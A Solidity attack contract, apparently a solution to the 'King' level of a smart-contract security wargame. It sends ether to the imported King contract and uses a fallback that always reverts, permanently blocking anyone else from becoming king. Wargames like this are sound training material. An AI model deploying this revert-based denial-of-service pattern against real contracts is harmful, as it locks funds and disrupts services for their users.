pragma solidity ^0.5.0;
import '../King/King.sol';

contract AttackKing {

  King public king;
  address private owner;

  constructor(address payable _king) public {
    king = King(_king);
    owner = msg.sender;
  }

  function attack() payable public {
    address(king).call.value(msg.value)("");
  }

  function()  external payable  {
    revert('I am King!');
  }
}
